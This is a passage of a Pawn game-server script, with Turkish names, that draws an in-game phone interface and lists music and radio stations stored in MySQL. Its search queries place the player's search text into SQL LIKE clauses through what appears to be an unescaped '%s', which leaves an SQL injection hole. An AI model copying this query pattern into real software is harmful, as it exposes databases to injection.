	PlayerTextDrawHide(playerid, TMM_BG[playerid]);
	PlayerTextDrawHide(playerid, TMM_UBar[playerid]);
	PlayerTextDrawHide(playerid, TMM_ABar[playerid]);
	PlayerTextDrawHide(playerid, TMM_Home[playerid]);
	PlayerTextDrawHide(playerid, TMM_Baslik[playerid]);
	PlayerTextDrawHide(playerid, TMM_Saat[playerid]);
	for(new tmmi; tmmi < 7; tmmi++) PlayerTextDrawHide(playerid, TMM_Item[playerid][tmmi]);
	PlayerTextDrawHide(playerid, TMM_OncekiS[playerid]);
	PlayerTextDrawHide(playerid, TMM_SonrakiS[playerid]);
	PlayerTextDrawHide(playerid, TMM_Sayfa[playerid]);

	PlayerTextDrawHide(playerid, TMM_HS1[playerid]);
	PlayerTextDrawHide(playerid, TMM_HS2[playerid]);
	PlayerTextDrawHide(playerid, TMM_HT[playerid]);
	PlayerTextDrawHide(playerid, TMM_HE[playerid]);
	PlayerTextDrawHide(playerid, TMM_Muzik[playerid]);
	PlayerTextDrawHide(playerid, TMM_MuzikL[playerid]);
	PlayerTextDrawHide(playerid, TMM_Radyo[playerid]);
	PlayerTextDrawHide(playerid, TMM_RadyoL[playerid]);
	PlayerTextDrawHide(playerid, TMM_Ayarlar[playerid]);
	PlayerTextDrawHide(playerid, TMM_AyarlarL[playerid]);
	PlayerTextDrawHide(playerid, TMM_Banka[playerid]);
	PlayerTextDrawHide(playerid, TMM_BankaL[playerid]);
	PlayerTextDrawHide(playerid, TMM_Krktr[playerid]);
	PlayerTextDrawHide(playerid, TMM_KrktrL[playerid]);

	PlayerTextDrawHide(playerid, TMM_Yeni[playerid]);
	PlayerTextDrawHide(playerid, TMM_YeniL[playerid]);
	PlayerTextDrawHide(playerid, TMM_Ara[playerid]);
	PlayerTextDrawHide(playerid, TMM_AraL[playerid]);

	if(TMM_APP[playerid] == APP_Yok) return CancelSelectTextDraw(playerid);

	PlayerTextDrawShow(playerid, TMM_BG[playerid]);
	PlayerTextDrawShow(playerid, TMM_UBar[playerid]);
	PlayerTextDrawShow(playerid, TMM_ABar[playerid]);
	PlayerTextDrawShow(playerid, TMM_Home[playerid]);
	PlayerTextDrawShow(playerid, TMM_Baslik[playerid]);
	PlayerTextDrawShow(playerid, TMM_Saat[playerid]);

	switch(TMM_APP[playerid])
	{
	    case APP_Home:
	    {
			PlayerTextDrawShow(playerid, TMM_HS1[playerid]);
			PlayerTextDrawShow(playerid, TMM_HS2[playerid]);
			PlayerTextDrawShow(playerid, TMM_HT[playerid]);
			PlayerTextDrawShow(playerid, TMM_HE[playerid]);
			PlayerTextDrawShow(playerid, TMM_Muzik[playerid]);
			PlayerTextDrawShow(playerid, TMM_MuzikL[playerid]);
			PlayerTextDrawShow(playerid, TMM_Radyo[playerid]);
			PlayerTextDrawShow(playerid, TMM_RadyoL[playerid]);
			PlayerTextDrawShow(playerid, TMM_Ayarlar[playerid]);
			PlayerTextDrawShow(playerid, TMM_AyarlarL[playerid]);
			PlayerTextDrawShow(playerid, TMM_Banka[playerid]);
			PlayerTextDrawShow(playerid, TMM_BankaL[playerid]);
			PlayerTextDrawShow(playerid, TMM_Krktr[playerid]);
			PlayerTextDrawShow(playerid, TMM_KrktrL[playerid]);
	    }

	    case APP_Muzik:
	    {
			PlayerTextDrawShow(playerid, TMM_OncekiS[playerid]);
			PlayerTextDrawShow(playerid, TMM_SonrakiS[playerid]);
			PlayerTextDrawShow(playerid, TMM_Sayfa[playerid]);

			PlayerTextDrawShow(playerid, TMM_Yeni[playerid]);
			PlayerTextDrawShow(playerid, TMM_YeniL[playerid]);
			PlayerTextDrawShow(playerid, TMM_Ara[playerid]);
			PlayerTextDrawShow(playerid, TMM_AraL[playerid]);

			MPSayfa[playerid] = 0;
			format(MPAra[playerid], 100, "-");
			MuzikListele(playerid);
	    }

	    case APP_Radyo:
	    {
			PlayerTextDrawShow(playerid, TMM_OncekiS[playerid]);
			PlayerTextDrawShow(playerid, TMM_SonrakiS[playerid]);
			PlayerTextDrawShow(playerid, TMM_Sayfa[playerid]);

			PlayerTextDrawShow(playerid, TMM_Yeni[playerid]);
			PlayerTextDrawShow(playerid, TMM_YeniL[playerid]);
			PlayerTextDrawShow(playerid, TMM_Ara[playerid]);
			PlayerTextDrawShow(playerid, TMM_AraL[playerid]);

			MPSayfa[playerid] = 0;
			format(MPAra[playerid], 100, "-");
			RadyoListele(playerid);
	    }

	    case APP_Ayarlar:
	    {
	        for(new tmmay; tmmay < 7; tmmay++) PlayerTextDrawBoxColor(playerid,TMM_Item[playerid][tmmay], 0xFF4040FF);
	        PlayerTextDrawSetString(playerid, TMM_Item[playerid][0], "Oyuncu Sifresini Degistir");
	        PlayerTextDrawShow(playerid, TMM_Item[playerid][0]);
	        PlayerTextDrawSetString(playerid, TMM_Item[playerid][1], "E-Posta Adresini Degistir");
	        PlayerTextDrawShow(playerid, TMM_Item[playerid][1]);
	        PlayerTextDrawSetString(playerid, TMM_Item[playerid][2], "Meslegini Degistir");
	        PlayerTextDrawShow(playerid, TMM_Item[playerid][2]);
	        PlayerTextDrawSetString(playerid, TMM_Item[playerid][3], "Cihaz Arkaplanini Degistir");
	        PlayerTextDrawShow(playerid, TMM_Item[playerid][3]);
	    }
	}

	SelectTextDraw(playerid, 0xFF4040FF);
	return 1;
}

// MuzikDialog
MuzikDialog(playerid)
{
	new DiaYazi[1024], DiaBaslik[128], query[256], mDinlenme, mName[100], mEkleyen[50], Cache: get_muzik;

	mysql_format(Connection, query, sizeof(query), "SELECT ID, Isim, Ekleyen, Dinlenme FROM muzikler WHERE ID = %d", MPSel[playerid]);
	get_muzik = mysql_query(Connection, query);
    new rows = cache_num_rows();

    if(rows)
    {
		cache_get_value_name(0, "Isim", mName);
	 	cache_get_value_name(0, "Ekleyen", mEkleyen);
	  	cache_get_value_name_int(0, "Dinlenme", mDinlenme);

		format(DiaBaslik, 128, "{80FFFF}%d# %s", MPSel[playerid], mName);
		format(DiaYazi, 1024, "{F8F8FF}Ekleyen\t{80FFFF}%s\n", mEkleyen);
		format(DiaYazi, 1024, "%s{F8F8FF}Dinlenme\t{FFC000}%d kez\n", DiaYazi, mDinlenme);
		format(DiaYazi, 1024, "%s{ADFF2F}Müziði Dinle\n", DiaYazi);

		if(APlayerData[playerid][PlayerLevel] > 0 || APlayerData[playerid][PlayerDjLevel] > 0 || Root[playerid] == 1)
		{
	 		format(DiaYazi, 1024, "%s{ADFF2F}Müziði Sunucuda Çal\n", DiaYazi);
		}

		if(APlayerData[playerid][PlayerLevel] > 0 || APlayerData[playerid][PlayerDjLevel] > 1 || Root[playerid] == 1)
		{
	   		format(DiaYazi, 1024, "%s{ADFF2F}Müziði Sil\n", DiaYazi);
		}

		ShowPlayerDialog(playerid, DialogMuzik, DIALOG_STYLE_TABLIST, DiaBaslik, DiaYazi, "Seç", "Kapat");
		if(tmodetype[playerid] == 1)tmodetype[playerid] = 0;
	}else{
	    SendClientMessage(playerid, -1, "{FF4040}Seçmiþ olduðunuz müzik silinmiþ veya bulunamadý!");
		if(tmodetype[playerid] == 0) MuzikListele(playerid);
	}

	cache_delete(get_muzik);
	return 1;
}

// MuzikListele
MuzikListele(playerid)
{
    for(new tmmzk; tmmzk < 7; tmmzk++) MPItem[playerid][tmmzk] = -1, PlayerTextDrawBoxColor(playerid,TMM_Item[playerid][tmmzk], 0xADFF2FFF), PlayerTextDrawSetString(playerid, TMM_Item[playerid][tmmzk], "-"), PlayerTextDrawShow(playerid, TMM_Item[playerid][tmmzk]);
	new query[256], mID, mName[100], Satir[128], mSatir[40], Cache: get_muzik;

	if(!strcmp("-", MPAra[playerid], true))
	{
   		mysql_format(Connection, query, sizeof(query), "SELECT * FROM `muzikler` ORDER BY `ID` ASC LIMIT %d, 7", MPSayfa[playerid] * 7);
		get_muzik = mysql_query(Connection, query);
  		new rows = cache_num_rows();

		if(rows)
		{
		    new mpidd;
  			for(new i; i < rows; ++i)
	    	{
      			cache_get_value_name(i, "Isim", mName);
      			cache_get_value_name_int(i, "ID", mpidd);
	        	format(Satir, 128, "%d# %s", mpidd, mName);

				if(strlen(Satir) > 30)
				{
    				strmid(mSatir, Satir, 0, 29, 40);
        			format(mSatir, 40, "%s...", mSatir);
        		}else{
          			format(mSatir, 40, Satir);
		        }

				cache_get_value_name_int(i, "ID", MPItem[playerid][mID]);
				PlayerTextDrawSetString(playerid, TMM_Item[playerid][mID], mSatir);
				mID++;
    		}
		}

		cache_delete(get_muzik);
	}else{
  		mysql_format(Connection, query, sizeof(query), "SELECT ID, Isim FROM muzikler WHERE Isim LIKE '%%%s%%' ORDER BY ID ASC LIMIT %d, 7", MPAra[playerid], MPSayfa[playerid] * 7);
		get_muzik = mysql_query(Connection, query);
  		new rows = cache_num_rows();

		if(rows)
		{
		    new mpidd;
  			for(new i; i < rows; ++i)
	    	{
      			cache_get_value_name(i, "Isim", mName);
                cache_get_value_name_int(i, "ID", mpidd);
	        	format(Satir, 128, "%d# %s", mpidd, mName);

				if(strlen(Satir) > 30)
				{
    				strmid(mSatir, Satir, 0, 29, 40);
        			format(mSatir, 40, "%s...", mSatir);
        		}else{
          			format(mSatir, 40, Satir);
		        }

				cache_get_value_name_int(i, "ID", MPItem[playerid][mID]);
				PlayerTextDrawSetString(playerid, TMM_Item[playerid][mID], mSatir);
				mID++;
    		}
		}

		cache_delete(get_muzik);
	}

	format(Satir, 128, "%d/%d", MPSayfa[playerid]+1, MuzikMaxSayfa(playerid));
	PlayerTextDrawSetString(playerid, TMM_Sayfa[playerid], Satir);
	return 1;
}

// MuzikMaxSayfa
MuzikMaxSayfa(playerid)
{
	new Sonuc, query[144], Cache: find_muzik;
	if(!strcmp("-", MPAra[playerid], true))
	{
		mysql_format(Connection, query, sizeof(query), "SELECT null FROM muzikler");
		find_muzik = mysql_query(Connection, query);

		new count = cache_num_rows();

		Sonuc = ( ( (count - (count % 7)) / 7)   ) + 1;
		cache_delete(find_muzik);
	}else{
		mysql_format(Connection, query, sizeof(query), "SELECT null FROM muzikler WHERE Isim LIKE '%%%s%%'", MPAra[playerid]);
		find_muzik = mysql_query(Connection, query);

		new count = cache_num_rows();

		Sonuc = ( ( (count - (count % 7)) / 7)   ) + 1;
		cache_delete(find_muzik);
	}
	return Sonuc;
}

// RadyoDialog
RadyoDialog(playerid)
{
	new DiaYazi[1024], DiaBaslik[128], query[256], mDinlenme, mName[100], mEkleyen[50], Cache: get_muzik;

	mysql_format(Connection, query, sizeof(query), "SELECT ID, Isim, Ekleyen, Dinlenme FROM radyolar WHERE ID = %d", MPSel[playerid]);
	get_muzik = mysql_query(Connection, query);
    new rows = cache_num_rows();

    if(rows)
    {
		cache_get_value_name(0, "Isim", mName);
	 	cache_get_value_name(0, "Ekleyen", mEkleyen);
	  	cache_get_value_name_int(0, "Dinlenme", mDinlenme);

		format(DiaBaslik, 128, "{80FFFF}%d# %s", MPSel[playerid], mName);
		format(DiaYazi, 1024, "{F8F8FF}Ekleyen\t{80FFFF}%s\n", mEkleyen);
		format(DiaYazi, 1024, "%s{F8F8FF}Dinlenme\t{FFC000}%d kez\n", DiaYazi, mDinlenme);
		format(DiaYazi, 1024, "%s{ADFF2F}Radyoyu Dinle\n", DiaYazi);

		if(APlayerData[playerid][PlayerLevel] > 0 || APlayerData[playerid][PlayerDjLevel] > 0 || Root[playerid] == 1)
		{
	 		format(DiaYazi, 1024, "%s{ADFF2F}Radyoyu Sunucuda Çal\n", DiaYazi);
		}

		if(APlayerData[playerid][PlayerLevel] > 0 || APlayerData[playerid][PlayerDjLevel] > 1 || Root[playerid] == 1)
		{
	   		format(DiaYazi, 1024, "%s{ADFF2F}Radyoyu Sil\n", DiaYazi);
		}

		ShowPlayerDialog(playerid, DialogMuzik, DIALOG_STYLE_TABLIST, DiaBaslik, DiaYazi, "Seç", "Kapat");
	}else{
	    SendClientMessage(playerid, -1, "{FF4040}Seçmiþ olduðunuz radyo istasyonu silinmiþ!");
		RadyoListele(playerid);
	}

	cache_delete(get_muzik);
	return 1;
}

// RadyoListele
RadyoListele(playerid)
{
    for(new tmmzk; tmmzk < 7; tmmzk++) MPItem[playerid][tmmzk] = -1, PlayerTextDrawBoxColor(playerid,TMM_Item[playerid][tmmzk], 0xADFF2FFF), PlayerTextDrawSetString(playerid, TMM_Item[playerid][tmmzk], "-"), PlayerTextDrawShow(playerid, TMM_Item[playerid][tmmzk]);
	new query[256], mID, mName[100], Satir[128], mSatir[40], Cache: get_muzik;

	if(!strcmp("-", MPAra[playerid], true))
	{
   		mysql_format(Connection, query, sizeof(query), "SELECT * FROM `radyolar` ORDER BY `ID` ASC LIMIT %d, 7", MPSayfa[playerid] * 7);
		get_muzik = mysql_query(Connection, query);
  		new rows = cache_num_rows();

		if(rows)
		{
		    new mpidd;
  			for(new i; i < rows; ++i)
	    	{
      			cache_get_value_name(i, "Isim", mName);
	        	cache_get_value_name_int(i, "ID", mpidd);
	        	format(Satir, 128, "%d# %s", mpidd, mName);

				if(strlen(Satir) > 30)
				{
    				strmid(mSatir, Satir, 0, 29, 40);
        			format(mSatir, 40, "%s...", mSatir);
        		}else{
          			format(mSatir, 40, Satir);
		        }

				cache_get_value_name_int(i, "ID", MPItem[playerid][mID]);
				PlayerTextDrawSetString(playerid, TMM_Item[playerid][mID], mSatir);
				mID++;
    		}
		}

		cache_delete(get_muzik);
	}else{
  		mysql_format(Connection, query, sizeof(query), "SELECT ID, Isim FROM radyolar WHERE Isim LIKE '%%%s%%' ORDER BY ID ASC LIMIT %d, 7", MPAra[playerid], MPSayfa[playerid] * 7);
		get_muzik = mysql_query(Connection, query);
  		new rows = cache_num_rows();

		if(rows)
		{
		    new mpidd;
  			for(new i; i < rows; ++i)
	    	{
      			cache_get_value_name(i, "Isim", mName);
      			cache_get_value_name_int(i, "ID", mpidd);
	        	format(Satir, 128, "%d# %s", mpidd, mName);

				if(strlen(Satir) > 30)
				{
    				strmid(mSatir, Satir, 0, 29, 40);
        			format(mSatir, 40, "%s...", mSatir);
        		}else{
          			format(mSatir, 40, Satir);
		        }

				cache_get_value_name_int(i, "ID", MPItem[playerid][mID]);
				PlayerTextDrawSetString(playerid, TMM_Item[playerid][mID], mSatir);
				mID++;
    		}
		}

		cache_delete(get_muzik);
	}

	format(Satir, 128, "%d/%d", MPSayfa[playerid]+1, RadyoMaxSayfa(playerid));
	PlayerTextDrawSetString(playerid, TMM_Sayfa[playerid], Satir);
	return 1;
}

// RadyoMaxSayfa
RadyoMaxSayfa(playerid)
{
	new Sonuc, query[144], Cache: find_muzik;
	if(!strcmp("-", MPAra[playerid], true))
	{
		mysql_format(Connection, query, sizeof(query), "SELECT null FROM radyolar");
		find_muzik = mysql_query(Connection, query);

		new count = cache_num_rows();

		Sonuc = ( ( (count - (count % 7)) / 7)   ) + 1;
		cache_delete(find_muzik);
	}else{
		mysql_format(Connection, query, sizeof(query), "SELECT null FROM radyolar WHERE Isim LIKE '%%%s%%'", MPAra[playerid]);
		find_muzik = mysql_query(Connection, query);

		new count = cache_num_rows();

		Sonuc = ( ( (count - (count % 7)) / 7)   ) + 1;
		cache_delete(find_muzik);
	}
	return Sonuc;
}

// SifirKoy
SifirKoy(sayi)
{
	new Sonuc[15];
	if(sayi >= 0 && sayi < 10)
	{
	    format(Sonuc, 15, "0%d", sayi);
	}else{
	    format(Sonuc, 15, "%d", sayi);
	}
	return Sonuc;
}

// LoadTMMobile
LoadTMMobile(playerid)
{
	// Temel
	new BGYazi[30]; format(BGYazi, 30, "loadsc%d:loadsc%d", TMM_BGSel[playerid], TMM_BGSel[playerid]);
	TMM_BG[playerid] = CreatePlayerTextDraw(playerid,493.000000, 199.000000, BGYazi);
	PlayerTextDrawBackgroundColor(playerid,TMM_BG[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_BG[playerid], 4);
	PlayerTextDrawLetterSize(playerid,TMM_BG[playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,TMM_BG[playerid], -1);
	PlayerTextDrawSetOutline(playerid,TMM_BG[playerid], 0);
	PlayerTextDrawSetProportional(playerid,TMM_BG[playerid], 1);
	PlayerTextDrawSetShadow(playerid,TMM_BG[playerid], 1);
	PlayerTextDrawUseBox(playerid,TMM_BG[playerid], 1);
	PlayerTextDrawBoxColor(playerid,TMM_BG[playerid], 255);
	PlayerTextDrawTextSize(playerid,TMM_BG[playerid], 139.000000, 165.000000);
	PlayerTextDrawSetSelectable(playerid,TMM_BG[playerid], 0);

	TMM_UBar[playerid] = CreatePlayerTextDraw(playerid,495.000000, 200.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,TMM_UBar[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_UBar[playerid], 1);
	PlayerTextDrawLetterSize(playerid,TMM_UBar[playerid], 0.500000, 0.500001);
	PlayerTextDrawColor(playerid,TMM_UBar[playerid], -1);
	PlayerTextDrawSetOutline(playerid,TMM_UBar[playerid], 0);
	PlayerTextDrawSetProportional(playerid,TMM_UBar[playerid], 1);
	PlayerTextDrawSetShadow(playerid,TMM_UBar[playerid], 1);
	PlayerTextDrawUseBox(playerid,TMM_UBar[playerid], 1);
	PlayerTextDrawBoxColor(playerid,TMM_UBar[playerid], -56);
	PlayerTextDrawTextSize(playerid,TMM_UBar[playerid], 630.000000, 0.000000);
	PlayerTextDrawSetSelectable(playerid,TMM_UBar[playerid], 0);

	TMM_ABar[playerid] = CreatePlayerTextDraw(playerid,495.000000, 346.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,TMM_ABar[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_ABar[playerid], 1);
	PlayerTextDrawLetterSize(playerid,TMM_ABar[playerid], 0.500000, 1.800001);
	PlayerTextDrawColor(playerid,TMM_ABar[playerid], -1);
	PlayerTextDrawSetOutline(playerid,TMM_ABar[playerid], 0);
	PlayerTextDrawSetProportional(playerid,TMM_ABar[playerid], 1);
	PlayerTextDrawSetShadow(playerid,TMM_ABar[playerid], 1);
	PlayerTextDrawUseBox(playerid,TMM_ABar[playerid], 1);
	PlayerTextDrawBoxColor(playerid,TMM_ABar[playerid], -16);
	PlayerTextDrawTextSize(playerid,TMM_ABar[playerid], 630.000000, 0.000000);
	PlayerTextDrawSetSelectable(playerid,TMM_ABar[playerid], 0);

	TMM_Home[playerid] = CreatePlayerTextDraw(playerid,555.000000, 347.000000, "hud:radar_mafiacasino");
	PlayerTextDrawAlignment(playerid,TMM_Home[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,TMM_Home[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_Home[playerid], 4);
	PlayerTextDrawLetterSize(playerid,TMM_Home[playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,TMM_Home[playerid], -16711681);
	PlayerTextDrawSetOutline(playerid,TMM_Home[playerid], 0);
	PlayerTextDrawSetProportional(playerid,TMM_Home[playerid], 1);
	PlayerTextDrawSetShadow(playerid,TMM_Home[playerid], 1);
	PlayerTextDrawUseBox(playerid,TMM_Home[playerid], 1);
	PlayerTextDrawBoxColor(playerid,TMM_Home[playerid], 255);
	PlayerTextDrawTextSize(playerid,TMM_Home[playerid], 16.000000, 15.000000);
	PlayerTextDrawSetSelectable(playerid,TMM_Home[playerid], 1);

	TMM_Baslik[playerid] = CreatePlayerTextDraw(playerid,495.000000, 198.000000, "TMMobile v1.0");
	PlayerTextDrawBackgroundColor(playerid,TMM_Baslik[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_Baslik[playerid], 1);
	PlayerTextDrawLetterSize(playerid,TMM_Baslik[playerid], 0.209998, 0.899999);
	PlayerTextDrawColor(playerid,TMM_Baslik[playerid], 255);
	PlayerTextDrawSetOutline(playerid,TMM_Baslik[playerid], 0);
	PlayerTextDrawSetProportional(playerid,TMM_Baslik[playerid], 1);
	PlayerTextDrawSetShadow(playerid,TMM_Baslik[playerid], 0);
	PlayerTextDrawSetSelectable(playerid,TMM_Baslik[playerid], 0);

	TMM_Saat[playerid] = CreatePlayerTextDraw(playerid,630.000000, 198.000000, ":::: 18:00");
	PlayerTextDrawAlignment(playerid,TMM_Saat[playerid], 3);
	PlayerTextDrawBackgroundColor(playerid,TMM_Saat[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_Saat[playerid], 1);
	PlayerTextDrawLetterSize(playerid,TMM_Saat[playerid], 0.209999, 0.899999);
	PlayerTextDrawColor(playerid,TMM_Saat[playerid], 255);
	PlayerTextDrawSetOutline(playerid,TMM_Saat[playerid], 0);
	PlayerTextDrawSetProportional(playerid,TMM_Saat[playerid], 1);
	PlayerTextDrawSetShadow(playerid,TMM_Saat[playerid], 0);
	PlayerTextDrawSetSelectable(playerid,TMM_Saat[playerid], 0);

	for(new i; i < 7; i++)
	{
		TMM_Item[playerid][i] = CreatePlayerTextDraw(playerid,499.000000, 215.0 + (15.0 * i), " ");
		PlayerTextDrawBackgroundColor(playerid,TMM_Item[playerid][i], 255);
		PlayerTextDrawFont(playerid,TMM_Item[playerid][i], 1);
		PlayerTextDrawLetterSize(playerid,TMM_Item[playerid][i], 0.209999, 0.899999);
		PlayerTextDrawColor(playerid,TMM_Item[playerid][i], 255);
		PlayerTextDrawSetOutline(playerid,TMM_Item[playerid][i], 0);
		PlayerTextDrawSetProportional(playerid,TMM_Item[playerid][i], 1);
		PlayerTextDrawSetShadow(playerid,TMM_Item[playerid][i], 0);
		PlayerTextDrawUseBox(playerid,TMM_Item[playerid][i], 1);
		PlayerTextDrawBoxColor(playerid,TMM_Item[playerid][i], 0xF8F8FFFF);
		PlayerTextDrawTextSize(playerid,TMM_Item[playerid][i], 626.000000, 13.000000);
		PlayerTextDrawSetSelectable(playerid,TMM_Item[playerid][i], 1);
	}

	TMM_OncekiS[playerid] = CreatePlayerTextDraw(playerid,499.000000, 330.000000, "<");
	PlayerTextDrawBackgroundColor(playerid,TMM_OncekiS[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_OncekiS[playerid], 1);
	PlayerTextDrawLetterSize(playerid,TMM_OncekiS[playerid], 0.209999, 0.899999);
	PlayerTextDrawColor(playerid,TMM_OncekiS[playerid], 255);
	PlayerTextDrawSetOutline(playerid,TMM_OncekiS[playerid], 0);
	PlayerTextDrawSetProportional(playerid,TMM_OncekiS[playerid], 1);
	PlayerTextDrawSetShadow(playerid,TMM_OncekiS[playerid], 0);
	PlayerTextDrawUseBox(playerid,TMM_OncekiS[playerid], 1);
	PlayerTextDrawBoxColor(playerid,TMM_OncekiS[playerid], -2130706433);
	PlayerTextDrawTextSize(playerid,TMM_OncekiS[playerid], 505.000000, 13.000000);
	PlayerTextDrawSetSelectable(playerid,TMM_OncekiS[playerid], 1);

	TMM_SonrakiS[playerid] = CreatePlayerTextDraw(playerid,620.000000, 330.000000, ">");
	PlayerTextDrawBackgroundColor(playerid,TMM_SonrakiS[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_SonrakiS[playerid], 1);
	PlayerTextDrawLetterSize(playerid,TMM_SonrakiS[playerid], 0.209999, 0.899999);
	PlayerTextDrawColor(playerid,TMM_SonrakiS[playerid], 255);
	PlayerTextDrawSetOutline(playerid,TMM_SonrakiS[playerid], 0);
	PlayerTextDrawSetProportional(playerid,TMM_SonrakiS[playerid], 1);
	PlayerTextDrawSetShadow(playerid,TMM_SonrakiS[playerid], 0);
	PlayerTextDrawUseBox(playerid,TMM_SonrakiS[playerid], 1);
	PlayerTextDrawBoxColor(playerid,TMM_SonrakiS[playerid], -2130706433);
	PlayerTextDrawTextSize(playerid,TMM_SonrakiS[playerid], 626.000000, 13.000000);
	PlayerTextDrawSetSelectable(playerid,TMM_SonrakiS[playerid], 1);

	TMM_Sayfa[playerid] = CreatePlayerTextDraw(playerid,562.500000, 330.000000, " ");
	PlayerTextDrawAlignment(playerid,TMM_Sayfa[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,TMM_Sayfa[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_Sayfa[playerid], 1);
	PlayerTextDrawLetterSize(playerid,TMM_Sayfa[playerid], 0.209999, 0.899999);
	PlayerTextDrawColor(playerid,TMM_Sayfa[playerid], 255);
	PlayerTextDrawSetOutline(playerid,TMM_Sayfa[playerid], 0);
	PlayerTextDrawSetProportional(playerid,TMM_Sayfa[playerid], 1);
	PlayerTextDrawSetShadow(playerid,TMM_Sayfa[playerid], 0);
	PlayerTextDrawUseBox(playerid,TMM_Sayfa[playerid], 1);
	PlayerTextDrawBoxColor(playerid,TMM_Sayfa[playerid], -117899282);
	PlayerTextDrawTextSize(playerid,TMM_Sayfa[playerid], 617.000000, 105.000000);
	PlayerTextDrawSetSelectable(playerid,TMM_Sayfa[playerid], 0);

	// Uygulama : Home
	TMM_HS1[playerid] = CreatePlayerTextDraw(playerid,544.000000, 220.000000, "05");
	PlayerTextDrawAlignment(playerid,TMM_HS1[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,TMM_HS1[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_HS1[playerid], 3);
	PlayerTextDrawLetterSize(playerid,TMM_HS1[playerid], 0.699998, 3.500000);
	PlayerTextDrawColor(playerid,TMM_HS1[playerid], 255);
	PlayerTextDrawSetOutline(playerid,TMM_HS1[playerid], 0);
	PlayerTextDrawSetProportional(playerid,TMM_HS1[playerid], 1);
	PlayerTextDrawSetShadow(playerid,TMM_HS1[playerid], 0);
	PlayerTextDrawUseBox(playerid,TMM_HS1[playerid], 1);
	PlayerTextDrawBoxColor(playerid,TMM_HS1[playerid], -2130706467);
	PlayerTextDrawTextSize(playerid,TMM_HS1[playerid], 628.000000, 32.000000);
	PlayerTextDrawSetSelectable(playerid,TMM_HS1[playerid], 0);

	TMM_HS2[playerid] = CreatePlayerTextDraw(playerid,583.000000, 220.000000, "05");
	PlayerTextDrawAlignment(playerid,TMM_HS2[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,TMM_HS2[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_HS2[playerid], 3);
	PlayerTextDrawLetterSize(playerid,TMM_HS2[playerid], 0.699998, 3.500000);
	PlayerTextDrawColor(playerid,TMM_HS2[playerid], 255);
	PlayerTextDrawSetOutline(playerid,TMM_HS2[playerid], 0);
	PlayerTextDrawSetProportional(playerid,TMM_HS2[playerid], 1);
	PlayerTextDrawSetShadow(playerid,TMM_HS2[playerid], 0);
	PlayerTextDrawUseBox(playerid,TMM_HS2[playerid], 1);
	PlayerTextDrawBoxColor(playerid,TMM_HS2[playerid], -2130706467);
	PlayerTextDrawTextSize(playerid,TMM_HS2[playerid], 628.000000, 32.000000);
	PlayerTextDrawSetSelectable(playerid,TMM_HS2[playerid], 0);

	TMM_HT[playerid] = CreatePlayerTextDraw(playerid,563.000000, 257.000000, "15 Haziran 2017");
	PlayerTextDrawAlignment(playerid,TMM_HT[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,TMM_HT[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_HT[playerid], 1);
	PlayerTextDrawLetterSize(playerid,TMM_HT[playerid], 0.209998, 0.899999);
	PlayerTextDrawColor(playerid,TMM_HT[playerid], -1);
	PlayerTextDrawSetOutline(playerid,TMM_HT[playerid], 1);
	PlayerTextDrawSetProportional(playerid,TMM_HT[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,TMM_HT[playerid], 0);

	TMM_HE[playerid] = CreatePlayerTextDraw(playerid,563.000000, 310.000000, "~r~|~p~~h~~h~||");
	PlayerTextDrawAlignment(playerid,TMM_HE[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,TMM_HE[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_HE[playerid], 1);
	PlayerTextDrawLetterSize(playerid,TMM_HE[playerid], 0.339998, 1.199998);
	PlayerTextDrawColor(playerid,TMM_HE[playerid], -1);
	PlayerTextDrawSetOutline(playerid,TMM_HE[playerid], 1);
	PlayerTextDrawSetProportional(playerid,TMM_HE[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,TMM_HE[playerid], 0);

	TMM_Muzik[playerid] = CreatePlayerTextDraw(playerid,510.000000, 333.000000, "Muzik");
	PlayerTextDrawAlignment(playerid,TMM_Muzik[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,TMM_Muzik[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_Muzik[playerid], 1);
	PlayerTextDrawLetterSize(playerid,TMM_Muzik[playerid], 0.209999, 0.899999);
	PlayerTextDrawColor(playerid,TMM_Muzik[playerid], -1);
	PlayerTextDrawSetOutline(playerid,TMM_Muzik[playerid], 1);
	PlayerTextDrawSetProportional(playerid,TMM_Muzik[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,TMM_Muzik[playerid], 0);

	TMM_MuzikL[playerid] = CreatePlayerTextDraw(playerid,502.000000, 320.000000, "hud:radar_datedisco");
	PlayerTextDrawAlignment(playerid,TMM_MuzikL[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,TMM_MuzikL[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_MuzikL[playerid], 4);
	PlayerTextDrawLetterSize(playerid,TMM_MuzikL[playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,TMM_MuzikL[playerid], -16776961);
	PlayerTextDrawSetOutline(playerid,TMM_MuzikL[playerid], 0);
	PlayerTextDrawSetProportional(playerid,TMM_MuzikL[playerid], 1);
	PlayerTextDrawSetShadow(playerid,TMM_MuzikL[playerid], 1);
	PlayerTextDrawUseBox(playerid,TMM_MuzikL[playerid], 1);
	PlayerTextDrawBoxColor(playerid,TMM_MuzikL[playerid], 255);
	PlayerTextDrawTextSize(playerid,TMM_MuzikL[playerid], 16.000000, 15.000000);
	PlayerTextDrawSetSelectable(playerid,TMM_MuzikL[playerid], 1);

